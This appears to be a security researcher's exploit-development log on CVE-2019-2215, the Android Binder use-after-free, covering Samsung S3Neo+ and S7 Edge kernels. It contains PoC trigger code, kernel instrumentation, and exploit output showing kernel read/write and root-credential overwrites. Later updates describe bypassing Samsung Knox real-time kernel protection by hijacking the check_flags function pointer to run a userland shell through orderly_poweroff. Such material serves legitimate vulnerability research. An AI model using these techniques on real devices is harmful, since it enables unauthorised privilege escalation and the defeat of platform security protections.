# CVE-2019-2215

Source:

https://bugs.chromium.org/p/project-zero/issues/detail?id=1942

https://bugs.chromium.org/p/project-zero/issues/attachmentText?aid=414885


Samsung S7 and S7 Edge with Kernel 3.18.x vulnerable (see https://github.com/arpruss/cve2019-2215-3.18)

Samsung S3Neo+ with LineageOS Kernel 3.4.0 possibly vulnerable (still in progress)

```

Kernel 3.4.0

https://github.com/S3NEO/android_kernel_samsung_s3ve3g/

No KASLR

No need to leak Kernel Struct Addresses.

binder_thread size:0xfc (252) 

wait queue offset:0x2c (44)


Had to add at least 2 entries for it to trigger, with 1, it didn't trigger

https://github.com/S3NEO/android_kernel_samsung_s3ve3g/blob/348ef929213854f5c7ce6b608e2ca0216d6bdce7/fs/eventpoll.c#L533

PoC:


#include <fcntl.h>
#include <sys/epoll.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <stdio.h>


#define BINDER_THREAD_EXIT 0x40046208ul
#define BINDER_VERSION 0xc0046209ul

int main()
{
    int fd,fd1,fd2, epfd,epfd1;
    struct epoll_event event = { .events = EPOLLOUT   };

    fd = open("/dev/binder", O_RDONLY);
    fd1 = open("/dev/random", O_RDONLY);
    epfd = epoll_create(1000);
    epfd1 = epoll_create(1000);
  

    if (epoll_ctl(epfd, EPOLL_CTL_ADD, fd, &event)) err(1, "epoll_add");
    if (epoll_ctl(epfd1, EPOLL_CTL_ADD, fd1, &event)) err(1, "epoll_add");




    //ioctl(fd, BINDER_VERSION, NULL);

    ioctl(fd, BINDER_THREAD_EXIT, NULL);
    printf("Finished here.");
}


Modified binder.c and evenpoll.c in the Kernel to see what is happening

binder.c

static int binder_free_thread(struct binder_proc *proc,
                              struct binder_thread *thread)
{
        struct binder_transaction *t;
        struct binder_transaction *send_reply = NULL;
        int active_transactions = 0;
        static const size_t memberOffset = offsetof(binder_thread, wait);
        wait_queue_head_t *wqhptr = &thread->wait;
        wait_queue_head_t *pwqhptr = &proc->wait;
        struct list_head *n1,*p1;

        wait_queue_t *my2;


        printk(KERN_INFO "iovec str size:%d",sizeof(iovec));
        printk(KERN_INFO "thread->task_list:%p",(void *)&wqhptr->task_list);
        printk(KERN_INFO "proc->task_list:%p",(void *)&pwqhptr->task_list);
        list_for_each_safe(p1,n1,  &pwqhptr->task_list){
          my2 = list_entry(p1, wait_queue_t, task_list);
          printk (KERN_INFO "p list= %p %p" ,(void*)my2->task_list.prev,(void*)my2->task_list.next);
        }
        list_for_each_safe(p1,n1,  &wqhptr->task_list){
          my2 = list_entry(p1, wait_queue_t, task_list);
          printk (KERN_INFO "t list= %p %p" ,(void*)my2->task_list.prev,(void*)my2->task_list.next);
        }

eventpoll.c

static void ep_remove_wait_queue(struct eppoll_entry *pwq)
{
        wait_queue_head_t *whead;
        wait_queue_t *strptr;
        struct list_head *n1,*p1;

        wait_queue_t *my2;


        rcu_read_lock();
        /* If it is cleared by POLLFREE, it should be rcu-safe */
        whead = rcu_dereference(pwq->whead);
        printk(KERN_INFO "whead before");

        if (whead)
        {
                strptr=&pwq->wait;


                list_for_each_safe(p1,n1,  &pwq->whead->task_list){
                my2 = list_entry(p1, wait_queue_t, task_list);

                printk (KERN_INFO "my2= %p %p" ,(void*)my2->task_list.prev,(void*)my2->task_list.next);
                }


                remove_wait_queue(whead, &pwq->wait);
                printk(KERN_INFO "remove wait queue:%p", (void*)&pwq->wait);
                printk(KERN_INFO "remove wait queue task list:%p", (void*)&strptr->task_list);

I see the list is printed.....but during Android Bootup not my PoC:

During Android start

[   84.747753] binder_ioctl: 1878:2371 40046208 0
[   84.747765] iovec str size:8
[   84.747771] thread->task_list:e4fb2e30
[   84.747777] proc->task_list:e57d866c
[   84.747784] p list= e57d866c e7fffe7c
[   84.747790] p list= e656de7c e57d866c
[   84.747797] binder_free_thread size:252 worker_off:44
[   84.747804] freed thread:e4fb2e00

I see proc->task_list ... 

PoC:

[  642.254192] wq queue:e7ce8798
[  642.254201] epoll struct:e7ce8780
[  642.254214] wq queue:e7ce8f98
[  642.254220] epoll struct:e7ce8f80
[  642.254230] wq queue:e7ce8718
[  642.254236] epoll struct:e7ce8700
[  642.254266] binder_ioctl: 7392:7392 40046208 0
[  642.254274] iovec str size:8
[  642.254280] thread->task_list:e5389b30
[  642.254286] proc->task_list:c309d86c
[  642.254292] binder_free_thread size:252 worker_off:44
[  642.254299] freed thread:e5389b00
[  642.254736] ep_unregister_pollwait struct:e7ce8780 epi struct:e51d0480
[  642.254792] ep_unregister_pollwait struct:e7ce8f80 epi struct:e51d0a80
[  642.254799] ep_unregister_pollwait list not empty
[  642.254805] whead before
[  642.254811] my2= c0f50cc4 c0f50cc4
[  642.254817] remove wait queue:e734b994
[  642.254823] remove wait queue task list:e734b9a0
[  642.254830] ep_unregister_pollwait list not empty
[  642.254835] whead before
[  642.254841] my2= c0f50cd0 c0f50cd0
[  642.254847] remove wait queue:e734bb24
[  642.254852] remove wait queue task list:e734bb30
[  642.254863] ep_free
[  642.254873] ep_free
[  642.254881] ep_free

However bug is not triggered in my PoC. I cannot see doubly list entiries under thread and proc :/


Here is where the use after free bug should come in.

Code:

ioctl(binder_fd, BINDER_THREAD_EXIT, NULL);

When this is called, the binder_thread structure is freed in the kernel.

Immediately after the parent process calls:

Code:

b = writev(pipefd[1], iovec_array, IOVEC_ARRAY_SZ);

In the kernel, memory is allocated to copy over iovec_array from userspace. This poc depends on the pointer from this allocation, to be the same as the recently freed binder_thread memory.

Then, when the child process exits, the EPOLL cleanup will use the waitqueue in the binder_thread structure, that has been overwritten with the values in iovec_array. When EPOLL cleanup unlinks the waitqueue, 0xDEADBEEF will get overwritten by a pointer in kernelspace. This has to happen just before the writev call in the parent process starts to copy over the second buffer, which gets us a kernel space memory leak.

If writev is returning 0x1000 it means the timing is off, the wait queue offset is off, the kmalloc allocation in the writev function isn't the same as the freed binder_thread, or your kernel isn't vulnerable. 

```

## Update 1

```
I narrowed it down ... so I want to replicate behavior of com.cyanogenmod.lockclock

It behaves like I want it to see:

    s3ve3g:/ # ps | grep 2140                                                    
    u0_a50    2140  257   845744 36336 sys_epoll_ b4ed9114 S com.cyanogenmod.lockclock

Source:

https://github.com/LineageOS/android_packages_apps_LockClock

    [   53.617686] binder_ioctl: 2140:2401 40046208 0
    [   53.617697] iovec str size:8
    [   53.617704] thread->task_list:e5b2c030
    [   53.617710] proc->task_list:e609206c
    [   53.617716] p list= e609206c e50c3e7c
    [   53.617722] p list= e50c5e7c e609206c
    [   53.617729] binder_free_thread size:252 worker_off:44
    [   53.617736] freed thread:e5b2c000
    [   53.617755] ep_unregister_pollwait struct:e5f5c680 epi struct:e5f4c280
    [   53.617762] ep_unregister_pollwait list not empty
    [   53.617768] whead before
    [   53.617773] my2= e8b10308 e8b10308
    [   53.617779] remove wait queue:e5fd755c
    [   53.617785] remove wait queue task list:e5fd7568
    [   53.617803] ep_free

I think Binder is used here:

    https://github.com/LineageOS/android_packages_apps_LockClock/blob/5239d22272aa2b7a2bcf2c45482395da3e163289/src/org/lineageos/lockclock/DeviceStatusService.java

Any idea how to replicate this using C (native) code?




```

## Update 2

Just found this PoC for 3.18 Kernels

https://github.com/arpruss/cve2019-2215-3.18

```
hero2lte:/data/local/tmp $ ./poc98                                             
Starting POC
Leak size 4096
dataBuffer = 699c20
PARENT: Calling WRITEV
CHILD: Doing EPOLL_CTL_DEL.
CHILD: Finished EPOLL_CTL_DEL.
CHILD: initial page
CHILD: dummy data
CHILD: leak data
writev() returns 0x12001
CHILD: Finished write to FIFO.
PARENT: Done with leaking
00000000  a0 2e a1 6c c8 ff ff ff a0 2e a1 6c c8 ff ff ff  |...l.......l....|
00000010  20 9c 69 00 00 00 00 00 01 00 01 00 00 00 00 00  | .i.............|
00000020  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |................|
00000030  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |................|
00000040  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |................|
00000050  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |................|
00000060  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |................|
00000070  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |................|
00000080  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |................|
00000090  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |................|
```

Works great!!!

Game over.

## Update 3

Poc from above works for me only to read kernel, not to write on Samsung S7 Edge


https://github.com/arpruss/cve2019-2215-3.18/issues/5

Will see I can get write access to kernel structs on Samsusng S7 Edge.


Poc run:

```
MAIN: detected kernel version 3
MAIN: starting exploit for devices with waitqueue at 0x98
PARENT: soon will be calling WRITEV
CHILD: Doing EPOLL_CTL_DEL.
CHILD: Finished EPOLL_CTL_DEL.
CHILD: initial portion length 0x12000
CHILD: task_struct_ptr = 0xffffffc01c7abe80
CHILD: clobbering with extra leak structures
PARENT: clobbering at 0xffffffc864b20ea0
CHILD: Doing EPOLL_CTL_DEL.
CHILD: Finished EPOLL_CTL_DEL.
CHILD: wrote 69688
PARENT: readv returns 69688, expected 69688
PARENT: clobbering test passed
CHILD: clobbered
PARENT: writev() returns 0x13008
PARENT: Reading leaked data
CHILD: task_struct_ptr = 0xffffffc01bea8000
CHILD: Finished write to FIFO.
PARENT: leaking successful
MAIN: task_struct_ptr = ffffffc01c7abe80
MAIN: stack = ffffffc01bea8000
MAIN: Clobbering addr_limit
PARENT: clobbering at 0xffffffc01bea8008
CHILD: Doing EPOLL_CTL_DEL.
CHILD: Finished EPOLL_CTL_DEL.
CHILD: wrote 69648
PARENT: readv returns 69648, expected 69648
PARENT: clobbering test passed
MAIN: thread_info = 0xffffffc01bea8000
MAIN: should have stable kernel R/W now
MAIN: searching for cred offset in task_struct
MAIN: offset_task_struct_cred = 0x610
MAIN: search_base = ffffffc001e50ee0
MAIN: searching for selinux_enforcing
found selinux_enforcing in /proc/kallsyms
MAIN: setting root credentials with cred offset 610
```

Kernel crashes:

```
<0>[   72.406735]  [4:           su98:10124] Bad mode in Error handler detected, code 0x56000000 -- SVC (AArch64)
<0>[   72.406766]  [4:           su98:10124] Internal error: Oops - bad mode: 0 [#1] PREEMPT SMP
<4>[   72.406792]  [4:           su98:10124] CPU: 4 PID: 10124 Comm: su98 Tainted: G        W      3.18.91-14843133-QB22482885 #1
<4>[   72.406812]  [4:           su98:10124] Hardware name: Samsung UNIVERSAL8890 board based on EXYNOS8890 (DT)
<4>[   72.406831]  [4:           su98:10124] task: ffffffc01c7abe80 ti: ffffffc01bea8000 task.ti: ffffffc01bea8000
<4>[   72.406850]  [4:           su98:10124] PC is at 0x780b283f78
<4>[   72.406865]  [4:           su98:10124] LR is at 0x0
<4>[   72.406882]  [4:           su98:10124] pc : [<000000780b283f78>] lr : [<0000000000000000>] pstate: 60000000
<4>[   72.406896]  [4:           su98:10124] sp : ffffffc01bea8000
<4>[   72.406911]  [4:           su98:10124] x29: ffffffc01beabc70 x28: ffffffc01beabda0 
<4>[   72.406931]  [4:           su98:10124] x27: 0000000000000000 x26: 0000000000000000 
<4>[   72.406949]  [4:           su98:10124] x25: 0000000000000000 x24: ffffffc01beabdb0 
<4>[   72.406966]  [4:           su98:10124] x23: ffffffc030d80904 x22: 0000000000000004 
<4>[   72.406981]  [4:           su98:10124] x21: ffffffbe1cac5cf0 x20: 0000000000000000 
<4>[   72.406997]  [4:           su98:10124] x19: 0000000000000004 x18: 0000000000000026 
<4>[   72.407012]  [4:           su98:10124] x17: 000000780b283f70 x16: ffffffc0002364ec 
<4>[   72.407026]  [4:           su98:10124] x15: 0000000000000000 x14: 000000780b2c4ed4 
<4>[   72.407040]  [4:           su98:10124] x13: 2074657366666f20 x12: 0000000000000000 
<4>[   72.407054]  [4:           su98:10124] x11: 000000780b4f71f0 x10: 000000780b4f71f0 
<4>[   72.407068]  [4:           su98:10124] x9 : ffffffc030d80904 x8 : ffffffc00023cc68 
<4>[   72.407082]  [4:           su98:10124] x7 : 0000000000000140 x6 : fffffffffffffffe 
<4>[   72.407096]  [4:           su98:10124] x5 : ffffffc030d80904 x4 : 0000000000000004 
<4>[   72.407110]  [4:           su98:10124] x3 : ffffffc01beabdb0 x2 : 0000000000000000 
<4>[   72.407123]  [4:           su98:10124] x1 : 0000000000000000 x0 : 0000000000000004 
<4>[   72.407136]  [4:           su98:10124] 
<0>[   72.407150]  [4:           su98:10124] Process su98 (pid: 10124, stack limit = 0xffffffc01bea8028)
<4>[   72.407165]  [4:           su98:10124] ---[ end trace e319032b6b6d2e35 ]---
<0>[   72.423082]  [0:  Binder:9211_4: 9732] Bad mode in Error handler detected, code 0x92000046 -- DABT (lower EL)
<0>[   72.451177]  [0:  Binder:9211_4: 9732] Internal error: Oops - bad mode: 0 [#2] PREEMPT SMP
<4>[   72.451205]  [0:  Binder:9211_4: 9732] CPU: 0 PID: 9732 Comm: Binder:9211_4 Tainted: G      D W      3.18.91-14843133-QB22482885 #1
<4>[   72.451231]  [0:  Binder:9211_4: 9732] Hardware name: Samsung UNIVERSAL8890 board based on EXYNOS8890 (DT)
<4>[   72.451254]  [0:  Binder:9211_4: 9732] task: ffffffc036bd4b00 ti: ffffffc033bcc000 task.ti: ffffffc033bcc000
<4>[   72.451279]  [0:  Binder:9211_4: 9732] PC is at 0x7786a57d54
<4>[   72.451299]  [0:  Binder:9211_4: 9732] LR is at 0x0
<4>[   72.451321]  [0:  Binder:9211_4: 9732] pc : [<0000007786a57d54>] lr : [<0000000000000000>] pstate: 20000000
<4>[   72.451341]  [0:  Binder:9211_4: 9732] sp : ffffffc033bcc000
```

Mobile info:

```
Linux localhost 3.18.91-14843133-QB22482885 #1 SMP PREEMPT Fri Mar 8 20:10:42 KST 2019 aarch64
```

Reading work, I was able to read task_struct cred (i.e OFFSET__cred__uid) successfully, writing does not :/

Samsung's RKP (RKP = Real-time Kernel Protection (RKP) - Samsung Knox) makes sure struct creds instances are mapped in read-only regions. Everything regarding these goes through their hypvervisor. Likely I am writing to RO memory.

So I guess no Root on Samsung with Knox.

## Update 4

Puh ... made it and uploaded my Custom Kernel to Samsung S7 Edge. Everything seems to work that not relies on Trustonic TEE (Wifi :( due to secrets, wifi passwords I think)

Want to do this now, overwrite system call pointer to execute my code from Userland in Kernelspace (to escape RKP = Realtime Kernel Protection i.e Samsung KNOX) - https://www.blackhat.com/docs/us-17/thursday/us-17-Shen-Defeating-Samsung-KNOX-With-Zero-Privilege-wp.pdf


Want to use ptmx_fops address and overwrite check_flags, get the check_flags offset through reversing fcntl syscall

Trying to find offset of check_flags() function used here:

```
fs/fcntl.c

#define SETFL_MASK (O_APPEND | O_NONBLOCK | O_NDELAY | O_DIRECT | O_NOATIME)

static int setfl(int fd, struct file * filp, unsigned long arg)
{
    struct inode * inode = file_inode(filp);
    int error = 0;

    /*
     * O_APPEND cannot be cleared if the file is marked as append-only
     * and the file is open for write.
     */
    if (((arg ^ filp->f_flags) & O_APPEND) && IS_APPEND(inode))
        return -EPERM;

    /* O_NOATIME can only be set by the owner or superuser */
    if ((arg & O_NOATIME) && !(filp->f_flags & O_NOATIME))
        if (!inode_owner_or_capable(inode))
            return -EPERM;

    /* required for strict SunOS emulation */
    if (O_NONBLOCK != O_NDELAY)
           if (arg & O_NDELAY)
           arg |= O_NONBLOCK;

    if (arg & O_DIRECT) {
        if (!filp->f_mapping || !filp->f_mapping->a_ops ||
            !filp->f_mapping->a_ops->direct_IO)
                return -EINVAL;
    }

    if (filp->f_op->check_flags)
        error = filp->f_op->check_flags(arg);
    if (error) 
        return error;

    /*
     * ->fasync() is responsible for setting the FASYNC bit.
     */
    if (((arg ^ filp->f_flags) & FASYNC) && filp->f_op->fasync) {
        error = filp->f_op->fasync(fd, filp, (arg & FASYNC) != 0);
        if (error < 0)
            goto out;
        if (error > 0)
            error = 0;
    }
    spin_lock(&filp->f_lock);
    filp->f_flags = (arg & SETFL_MASK) | (filp->f_flags & ~SETFL_MASK);
    spin_unlock(&filp->f_lock);

 out:
    return error;
}
```

Heard that:

check_flags function is used in setfl() from fcntl.c. Most of the time it's inlined in sys_fcntl, so you can find that address from kallsyms and find it from there.

Now I can try to debug it within the Kernel, save hassles with Debuggers.


## Update 5

Looks good. Overwrote check_flags() with my code 0xff, Bypassing Knox 3.1. Nice!

```
<0>[  213.797112]  [6:           main:13743] Kernel BUG at 00000000000000ff [verbose debug info unavailable]
<0>[  213.797121]  [6:           main:13743] Internal error: Oops - BUG: 8a000000 [#1] PREEMPT SMP
<0>[  213.797133]  [6:           main:13743] exynos-snapshot: exynos_ss_get_reason 0x0 (CPU:6) 
<0>[  213.797144]  [6:           main:13743] exynos-snapshot: core register saved(CPU:6)
<0>[  213.797153]  [6:           main:13743] FEMERR0SR: 0000000020030000, FEMERR1SR: 00000000000000ba
<0>[  213.797162]  [6:           main:13743] LSMERR0SR: 0000000000000000, LSMERR1SR: 0000000000000000
<0>[  213.797171]  [6:           main:13743] TBWMERR0SR: 0000000000000000, TBWMERR1SR: 0000000000000000
<0>[  213.797179]  [6:           main:13743] L2MERR0SR: 0000000000000000, L2MERR1SR: 0000000000000000
<0>[  213.797188]  [6:           main:13743] SCTLR_EL1: 04C5591D,
<0>[  213.797198]  [6:           main:13743] exynos-snapshot: context saved(CPU:6)
<6>[  213.797587]  [6:           main:13743] exynos-snapshot: item - log_kevents is disabled
<4>[  213.797606]  [6:           main:13743] CPU: 6 PID: 13743 Comm: main Tainted: G        W      3.18.91.Nethunter-WirusMOD-v1.4 #4
<4>[  213.797619]  [6:           main:13743] Hardware name: Samsung UNIVERSAL8890 board based on EXYNOS8890 (DT)
<4>[  213.797630]  [6:           main:13743] task: ffffffc80c785780 ti: ffffffc00db14000 task.ti: ffffffc00db14000
<4>[  213.797641]  [6:           main:13743] PC is at 0xff
<4>[  213.797657]  [6:           main:13743] LR is at SyS_fcntl+0x240/0x4d4
<4>[  213.797667]  [6:           main:13743] pc : [<00000000000000ff>] lr : [<ffffffc000245e00>] pstate: 20000145
<4>[  213.797676]  [6:           main:13743] sp : ffffffc00db17e60
<4>[  213.797684]  [6:           main:13743] x29: ffffffc00db17e60 x28: ffffffc00db14000 
<4>[  213.797696]  [6:           main:13743] x27: ffffffc000d62000 x26: 0000000000000019 
<4>[  213.797707]  [6:           main:13743] x25: 0000000000000119 x24: 0000000000000003 
<4>[  213.797717]  [6:           main:13743] x23: ffffffc806d3d900 x22: 0000000000020000 
<4>[  213.797727]  [6:           main:13743] x21: 0000000000000004 x20: ffffffc806d3d900 
<4>[  213.797736]  [6:           main:13743] x19: ffffffc86ecd4510 x18: 00000000000221fe 
<4>[  213.797746]  [6:           main:13743] x17: 000000713c5c2970 x16: ffffffc000245bc0 
<4>[  213.797755]  [6:           main:13743] x15: 0000000000000000 x14: 0fffffffffffffff 
<4>[  213.797764]  [6:           main:13743] x13: 0000000000000000 x12: 0101010101010101 
<4>[  213.797773]  [6:           main:13743] x11: 7f7f7f7f7f7f7f7f x10: fefefefefefefeff 
<4>[  213.797782]  [6:           main:13743] x9 : 7f7f7f7fffffffff x8 : 6666203a79646461 
<4>[  213.797791]  [6:           main:13743] x7 : 207367616c665f6b x6 : ffffffc0023f8d54 
<4>[  213.797801]  [6:           main:13743] x5 : 0000000000000140 x4 : 0000000000000000 
<4>[  213.797810]  [6:           main:13743] x3 : 0000000000000007 x2 : ffffffc00db14000 
<4>[  213.797820]  [6:           main:13743] x1 : 00000000000000ff x0 : 0000000000020000 
<4>[  213.797830]  [6:           main:13743] 
<4>[  213.797830]  [6:           main:13743] LR: 0xffffffc000245d00:
```

To be continued ....

## Update 6

Yep, was able to modify check_falgs to call orderly_poweroff() with my paremeters as per BH Keen Security Lab paper mentioned above.

```
hero2lte:/data/local/tmp # uname -a
Linux localhost 3.18.91.marcinguy-lab #8 SMP PREEMPT Sat Nov 16 15:12:04 CET 2019 aarch64
```


```
[  305.681937] cmd ffffffc00219a510
[  305.681946] cmd /sbin/poweroff
```

```
[  408.864455] cmd ffffffc00219a510
[  408.864463] cmd /data/local/tmp/sh
```

Some additonal steps have to be done. Maybe when I get time, I work on it futher.

Anyway, surprised that this still works on Knox 3.1 ... and maybe newer also

## Update 7

This could save you tons of time:

https://medium.com/@alex91ar/debugging-the-samsung-android-kernel-part-3-a6a7f762fcd6

Also the offical Write up from P0 is there:

https://googleprojectzero.blogspot.com/2019/11/bad-binder-android-in-wild-exploit.html


## Update 8

It turned out my Samsung S3Neo+ with LineageOS Kernel 3.4.0 was messed up, so the behavior was only specific to my device. On other researcher device, it worked correctly, however the exploitation was not possible (the Research was not able to trigger the condition). I can assume 3.4.0 are not vulnerable.

## Update 9

That's how the situation looks like on Kernel 3.4.0

You can see that thread is freed (kfree:e2114000), but the waitlist address is different when cleaning in epoll cleanup code (e7e1bf18):

```
[  160.680907] thread->task_list:e2114030
[  160.680946] proc->task_list:e211526c
[  160.680980] kfree:e2114000
[  160.688249] p or t= c12d3c7c c12d3c7c
[  160.688261] remove wait queue:e7e1bf0c
[  160.688270] remove wait queue task list:e7e1bf18
[  160.688281] p or t= c12d3c88 c12d3c88
[  160.688290] remove wait queue:e7e1bebc
[  160.688299] remove wait queue task list:e7e1bec8
```

This is based on this test case, which only one polling it would not work, hence below I do it for 2 files:


```
#include <fcntl.h>
#include <sys/epoll.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <stdio.h>


#define BINDER_THREAD_EXIT 0x40046208ul
#define BINDER_VERSION 0xc0046209ul

int main()
{
    int fd,fd1,fd2, epfd,epfd1;
    struct epoll_event event = { .events = EPOLLIN   };

    fd = open("/dev/binder", O_RDONLY);
    fd1 = open("/dev/random", O_RDONLY);
    epfd = epoll_create(1000);
    epfd1 = epoll_create(1000);
  

    if (epoll_ctl(epfd, EPOLL_CTL_ADD, fd, &event)) err(1, "epoll_add");
    if (epoll_ctl(epfd1, EPOLL_CTL_ADD, fd1, &event)) err(1, "epoll_add");




    ioctl(fd1, BINDER_THREAD_EXIT, NULL);


    ioctl(fd, BINDER_THREAD_EXIT, NULL);
    printf("Finished here.");
}
```

With one file pollling:


```
[ 1622.590604] thread->task_list:e5309430
[ 1622.590645] proc->task_list:e530966c
```




